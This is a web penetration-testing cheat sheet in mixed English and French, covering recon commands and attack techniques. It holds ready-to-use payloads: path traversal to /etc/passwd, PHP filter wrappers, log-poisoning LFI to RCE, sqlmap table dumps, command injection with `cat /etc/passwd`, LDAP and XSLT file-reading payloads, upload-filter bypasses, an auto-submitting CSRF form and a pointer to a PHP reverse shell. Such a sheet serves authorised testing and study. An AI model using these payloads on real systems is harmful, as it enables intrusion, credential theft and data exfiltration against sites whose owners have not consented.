# Tools
- Javascript deobfuscator/beautifier
- cURL (client http en CLI)
- Burp Suit (HTTP proxy, scanner) + extensions CEO (SQLmap) et JSON web token attacker (JOSEPH)
- dirb/wfuzz (website directory discover)
- SecLists (https://github.com/danielmiessler/SecLists)

# Methodology
## OSINT/Recon 
- **ping** : $ ping www.site.com 
- **whois** : $ whois 'www.site.com' ; $ whois <ip>
- **google dorks** : search for credentials : "intext:<thetarget> AND intext:@gmail.com AND intext:password" ; Tools : FastGoogleDorks, theharvester    
- **DNS** : DNS records : $ dig domain.com ANY ; PS> nslookup -q=TXT domain.com 
AXFR transfert zone
- **VHOSTS** : HTTP "Host" header modification or "/etc/hosts" file modification to access potential VHOST 
- **Subdomains enumeration** : $ amass enum -passive -d domain.com -src 
- **Network scan** : $ nmap -p- sV site.com // -A version detection -oA fichier_out  

## Client source code
- **Information** : CMS version ; file disclosure(.js files) ; unsafe cross-domain include

## Server config
Information gathering & vuln identifier: 
https://github.com/codingo/Reconnoitre 

### URL: 
- **Unprotected references/directory listing** : dirb+wfuzz w/ SecLists (raft-medium-files.txt & raft-large-files.txt) (unprotected refs such as /admin/, robots.txt, sitemap.xml, etc.)  
- **Backup files** : /dev/, index.php~, /.git/, index.php.bak, index.php.old, .phps, .swp, etc.
- **Full Path Disclosure** [/index.php?file[]=1   (array include bug 'can't include an array'), https://www.owasp.org/index.php/Full_Path_Disclosure]
- **Redirections** : $ curl -v 

### REQUESTS:
- Test all headers 
- Test all methods (TRACE, PUT, DELETE, OPTIONS)
- Verb tampering (.htacces -> request w/ custom method $ curl -X YOLO)

- Fonctions PHP dangereuses, evaluation de code (preg_replace()+e modifier, assert(), include()...)
- PHP type juggling (loose comparison, strcmp(array()), magic hashes)
- Packages vulnerables ex:phpbb [www.exemple.com/phpbb/install/...]

## Authentication

- Authentication (Cookies, JWT, etc...)
[JWT attacks : Burp Extension : None algorithm header change, signature algorithm bypass, bruteforce]
- Cloisonnement users ? privesc ? lateral move ? -> Burp AuthMatrix
- CSRF ? [is the auth cookie-based ? is there an unpredictable element checked on the server-side for each request ?]

## Injections & inputs sanitizing

### SERVER SIDE:
- Check PayloadAllTheThings ( https://github.com/swisskyrepo/PayloadsAllTheThings )
**File inclusion**  
LFI [?f=../../etc/passwd, wrappers(voir PDF wrappers-filters): ?inc=php://filter/read=convert.base64-encode/resource=, ]
 + double encoding
 LFI to RCE : try PHP code injection from Apache logs : Request GET /<?php phpinfo(); ?> then include the /var/log/apache2/access.log file
 CHECK LFI TO RCE PayloadAllTheThings
 RFI : base64, view_source()...
test : passer des arrays en arguments, certaines fonctions PHP plantent (ex strcmp(), include(), etc.)
 Ã‰chappement : CRLF[%0A], NULL BYTE[%00], Php truncation [a/../admin.html/./.[x4096]././././] 
 
**Path traversal**  
[DotDotPwn]

**SQL injection**  
[authentification(classic,gbk=å‘µ' or 1=1 #, \xbf\x27), string(identify columns number with ' UNION SELECT NULL,NULL,NULL, numÃ©rique, SQLmap]
SQLi method : 
	If format like "id=1" -> integer-based injection
	If format like "username=toto" -> string-based injection

	1 - Target the field of the request
	2 - Find if it is string-based or integer-based
	3 - Try to trigger an error
	4 - Try to fallback on the default payload by modifying it 

[sqlmap -u "http://testsite.com/login.php" --dbs]
[sqlmap -u "http://lesite.com/index.php" --data "username=login&password=pass" -D site_db --tables]
[sqlmap -u "http://lesite.com/index.php" --data "username=login&password=pass" -D site_db -T users --dump] 
order by : nombre de colonnes
Error based : convert(), file_name()...

**Command injection**  
[original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
original_cmd_by_server || ls    Only if the first cmd fail
Command execution inside a command :
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)]

**XPATH injection**   


**Template injection**  
${2*2} (server-side,voir PDF)

**LDAP injection**  
(&(uid=*))(userPassword=*)(&))

**XSLT code execution**  
exemple :  
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">  
<xsl:template match="/">  
<xsl:value-of select="php:function('file_get_contents','index.php')"/>  
<xsl:value-of select="php:function('opendir','/directory/')"/>  
<xsl:value-of select="php:function('chdir','/directory/')"/>  
<xsl:value-of select="php:function('readdir')"/>  
</xsl:template>  
</xsl:stylesheet>  


**XXE (XML External Entity)**  
exemple dans un flux rss :   
TODO 

**GraphQL injection**  
- query={__schema{types{name,fields{name}}}} to enumerate 

**FILE UPLOAD**  
- Send an EICAR file (for audits)
- PUT method
- Double extension [.php.jpg]
- Type MIME modification : change Content-Type : "application/x-php" to "image/gif", "image/png", "image/jpeg"
- Null byte  
.php%00.jpg
.php\x00.jpg
- Magic bytes file signature(ex : add GIF89a in the beginning of the file for .gif)
- zip + lien symbolique (zip --symlinks test.zip lien, avec ln -s /etc/passwd lien)

### CLIENT SIDE:
**XSS**  
[document.write(unescape()), document.write(String.fromCharCode(unicode))]

**CSRF**  
3 regles :
1. L'attaquant a une raison de provoquer l'atq
2. Authentification repose uniquement sur des cookies de session
3. Pas d'element impredictible dans la requete
-> Generate CSRF PoC Burp
exemple de form : ( <form name="test" method="post"
action="http://sitevuln.fr/profiles/?action=profile">
<input type="checkbox" name="admin" checked >
</form>
<script>document.test.submit()</script>)


## Encryption protocols & ciphers
- testssl.sh : weak ciphersuites/protocols ?

## NETWORK =

- Transfert de zone DNS si misconfig [dig @SERVEURDNS -p *port* AXFR *domaine*]
- LDAP null bind [ldapsearch -x -h *le.server.ldap* -p *port* -s base -b '' "(objectClass=*)" "*" +]

# Exploitation

- Reverse shell : pentestmonkey php reverse shell
